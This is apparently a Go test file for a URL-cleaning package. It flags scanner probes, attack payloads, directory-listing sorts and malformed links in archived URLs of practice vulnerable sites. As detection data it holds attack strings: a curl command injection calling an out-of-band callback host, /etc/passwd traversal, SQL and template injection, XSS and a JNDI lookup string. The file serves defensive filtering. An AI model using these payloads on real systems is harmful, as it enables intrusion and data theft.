package webextract

import "testing"

func TestJunkURL(t *testing.T) {
	for raw, want := range map[string]bool{
		"http://app/rest/basket/NaN":                          true,
		"http://app/api/user/undefined/orders":                true,
		"http://testphp.vulnweb.com/login.ph%E2%80%A6":        true,
		"http://testphp.vulnweb.com/login.php).":              true,
		"http://testphp.vulnweb.com/cart.php.%5B":             true,
		"http://demo.testfire.net/1234567890*~1*/index.jsp":   true,
		"http://app/search/%3Cscript%3Ealert(1)%3C/script%3E": true,
		"http://app/rest/basket/6":                            false,
		"http://app/index.jsp?content=inside_contact.htm":     false,
		"http://app/products/(category)":                      false,
		"http://app/a/b.php":                                  false,
		"http://app/":                                         false,
	} {
		if got := JunkURL(raw); got != want {
			t.Errorf("%s: %v, want %v", raw, got, want)
		}
	}
}

func TestListingSort(t *testing.T) {
	for raw, want := range map[string]bool{
		"http://dvwa/dvwa/css/?C=N;O=D":          true,
		"http://dvwa/dvwa/css/?C=M;O=A":          true,
		"http://dvwa/docs/?C=S&O=D":              true, // nginx fancyindex
		"http://dvwa/docs/?C=D;O=A;F=2;V=1;P=*":  true,
		"http://dvwa/docs/?C=N":                  false,
		"http://dvwa/docs/?C=X;O=D":              false,
		"http://dvwa/docs/?C=N;O=D;page=2":       false,
		"http://app/search?c=n&o=d":              false,
		"http://app/product?C=N&O=D&id=3":        false,
		"http://dvwa/dvwa/css/":                  false,
		"http://dvwa/vulnerabilities/fi/?page=1": false,
	} {
		if got := ListingSort(raw); got != want {
			t.Errorf("%s: %v, want %v", raw, got, want)
		}
		if JunkURL(raw) != want {
			t.Errorf("JunkURL(%s) != %v", raw, want)
		}
	}
}

func TestJunkURLPayloads(t *testing.T) {
	for _, raw := range []string{
		"http://testfire.net/__weave/file/etc/passwd",
		"http://testfire.net/api/v1/license/keys-status/;curl%20d9q3n.oast.live",
		"http://a.test/x?q=%27%20or%201%3D1--",
		"http://a.test/x?name=%7B%7B7*7%7D%7D",
		"http://a.test/redirect?to=javascript:alert(1)",
		"http://a.test/..%2f..%2fwin.ini",
		"http://a.test/x?u=%2524%257Bjndi:ldap://x%257D",
	} {
		if !JunkURL(raw) {
			t.Errorf("JunkURL(%s) = false", raw)
		}
	}
	for _, raw := range []string{
		"http://a.test/rest/products/search?q=apple",
		"http://a.test/index.jsp?content=inside_about.htm",
		"http://a.test/api/v1/license/keys-status",
		"http://a.test/blog/post?postId=3",
	} {
		if JunkURL(raw) {
			t.Errorf("JunkURL(%s) = true", raw)
		}
	}
}

func TestJunkURLDotSegments(t *testing.T) {
	for raw, want := range map[string]bool{
		"http://ginandjuice.shop/..":     true, // an archive kept it as written
		"http://a.test/a/./b":            true,
		"http://a.test/a/%2e%2e/b":       true,
		"http://a.test/.well-known/csaf": false,
		"http://a.test/a/b.c/d":          false,
		"http://a.test/..x/y":            false,
	} {
		if got := JunkURL(raw); got != want {
			t.Errorf("JunkURL(%s) = %v, want %v", raw, got, want)
		}
	}
}

func TestStringNoise(t *testing.T) {
	for p, want := range map[string]bool{
		// Cut out of a parser table or a minified bundle.
		"/pQ": true, "/SQ": true, "/A": true, "http://a.test/Xy": true,
		// A package named after its owner.
		"/juice-shop/juice-shop": true, "/socket.io/socket.io?x=1": true,
		// A word twice is a route like any other.
		"/admin/admin": false, "/api/api": false, "/test/test": false, "/lodash/lodash": false,
		// Short routes, and anything with a longer segment.
		"/v1": false, "/v3": false, "/api": false, "/me": false, "/id": false, "/go": false,
		"/en/us": false, "/en/US": false, "/v2/Me": false, "/aB/c": false, "/s/1": false, "/api/Q": false, "/Users": false, "/IO/stream": false,
		"/admin/users": false, "/a/a": false, "/": false, "/api/api/v1": false,
	} {
		if got := StringNoise(p); got != want {
			t.Errorf("StringNoise(%s) = %v, want %v", p, got, want)
		}
	}
}

func TestVersionPrefix(t *testing.T) {
	for raw, want := range map[string]bool{
		"http://a.test/v3": true, "http://a.test/v1/": true, "http://a.test/api/v2": true, "http://a.test/V2.1": true,
		"http://a.test/v3/users": false, "http://a.test/api": false, "http://a.test/vue": false, "http://a.test/docs/v2": false,
	} {
		if got := VersionPrefix(raw); got != want {
			t.Errorf("VersionPrefix(%s) = %v, want %v", raw, got, want)
		}
	}
}

func TestPayloadKeepsLegitimateURLs(t *testing.T) {
	for _, raw := range []string{
		"http://a.test/loader.js?onload=init",
		"http://a.test/page?x=1&curlang=en",
		"http://a.test/login?next=../dashboard",
		"https://requestbin.example.org/api/items",
		"http://a.test/search?q=rock%20or%20pop",
		"http://a.test/docs/sleep-tracking",
	} {
		if Payload(raw) {
			t.Errorf("Payload(%s) = true", raw)
		}
	}
}

// A scanner's own files and tags, and its random executables, kept by
// an archive, never enter the map; a product page or a file a person
// named does.
func TestJunkURLScannerArtifacts(t *testing.T) {
	for _, raw := range []string{
		"http://testphp.vulnweb.com/acunetix_xsl_inclusion_test.xsl",
		"http://a.test/acunetix-wvs-test-for-some-inexistent-file",
		"http://a.test/netsparker(0).txt",
		"http://a.test/x?invicti=1",
		"http://a.test/search?q=bxss.me/t/xss.html",
		"http://a.test/x?name=appscan_fingerprint",
		"http://a.test/nessus_test.php",
		"http://a.test/qualystest",
		"http://a.test/x?u=http://xss.rocks/x.js",
		"http://testphp.vulnweb.com/7zSo1DIz.exe",
		"http://testphp.vulnweb.com/NhYzAp8A.exe",
		"http://a.test/aB3dEf.dll",
	} {
		if !JunkURL(raw) {
			t.Errorf("JunkURL(%s) = false", raw)
		}
	}
	for _, raw := range []string{
		"http://tenable.test/products/nessus",
		"http://a.test/nessus",
		"http://a.test/docs/qualys-integration",
		"http://a.test/blog/appscan",
		"http://a.test/downloads/Setup64.exe",
		"http://a.test/winrar.exe",
		"http://a.test/files/7zSo1DIz.exe",
		"http://a.test/putty.exe",
		"http://a.test/x?q=netsparker",
	} {
		if JunkURL(raw) {
			t.Errorf("JunkURL(%s) = true", raw)
		}
	}
}

// JunkReason says which kind of junk a URL is, and agrees with JunkURL.
func TestJunkReason(t *testing.T) {
	for raw, want := range map[string]string{
		"http://example.org/page?x=<script>alert(1)</script>": JunkPayload,
		"http://example.org/?q=../../../../etc/passwd":        JunkPayload,
		"http://example.org/acunetix_xsl_inclusion_test.xsl":  JunkScanner,
		"http://example.org/7zSo1DIz.exe":                     JunkScanner,
		"http://example.org/files/?C=N;O=D":                   JunkListing,
		"http://example.org/rest/basket/NaN":                  JunkPlaceholder,
		"http://example.org/a/../b":                           JunkDot,
		"http://example.org/1234567890*~1*/x":                 JunkMalformed,
		"http://example.org/login.php).":                      JunkSentence,
		"http://example.org/login.php":                        "",
		"http://example.org/products/nessus":                  "",
	} {
		got := JunkReason(raw)
		if got != want {
			t.Errorf("%s: %q, want %q", raw, got, want)
		}
		if JunkURL(raw) != (want != "") {
			t.Errorf("%s: JunkURL disagrees", raw)
		}
	}
}

// A query no page was given, and a NUL byte, are a scanner's probes: the
// archive keeps them beside the clean URL. A query with a name and value, a
// dotted value or a bare word stays.
func TestJunkURLScannerProbeQueries(t *testing.T) {
	for _, raw := range []string{
		"http://testasp.vulnweb.com/t/fit.txt?.",
		"http://testasp.vulnweb.com/t/fit.txt?.tst",
		"http://testasp.vulnweb.com/t/fit.txt?.bak",
		"http://testasp.vulnweb.com/t/fit.txt?.old",
		"http://testasp.vulnweb.com/t/fit.txt?%00",
		"http://testasp.vulnweb.com/t/fit.txt%00.php",
		"http://testasp.vulnweb.com/t/fit.txt?id=1%00",
		"http://testasp.vulnweb.com/t/fit.txt?id=1%2500",
		"http://testasp.vulnweb.com/t/fit.txt?%00=1",
		"http://testasp.vulnweb.com/a%00/b",
		"http://testasp.vulnweb.com/t/fit.txt?..",
		"http://testasp.vulnweb.com/t/fit.txt?;",
		"http://testasp.vulnweb.com/t/fit.txt?*",
		"http://testasp.vulnweb.com/t/fit.txt?-",
		"http://testasp.vulnweb.com/t/fit.txt?%2e",
		"http://testasp.vulnweb.com/t/fit.txt?%2etst",
	} {
		if got := JunkReason(raw); got != JunkScanner {
			t.Errorf("JunkReason(%s) = %q, want %q", raw, got, JunkScanner)
		}
	}
	for _, raw := range []string{
		"http://testasp.vulnweb.com/t/fit.txt",
		"http://testasp.vulnweb.com/t/fit.txt?",
		"http://a.test/x?v=1.2",
		"http://a.test/x?v=.tst",
		"http://a.test/x?file=a.bak",
		"http://a.test/x?id=1",
		"http://a.test/x?id=",
		"http://a.test/x?1.2",
		"http://a.test/style.css?v1.2.3",
		"http://a.test/x?search",
		"http://a.test/x?a=1&.tst",
		"http://a.test/x?q=caf%C3%A9",
		"http://a.test/x?.tst=1",
		"http://a.test/x?100%25",
		"http://a.test/docs/v1.0.0/index.html",
		"http://a.test/files/archive.tar.gz?download",
		"http://a.test/x?.toolongextension1",
	} {
		if got := JunkReason(raw); got != "" {
			t.Errorf("JunkReason(%s) = %q, want none", raw, got)
		}
	}
}
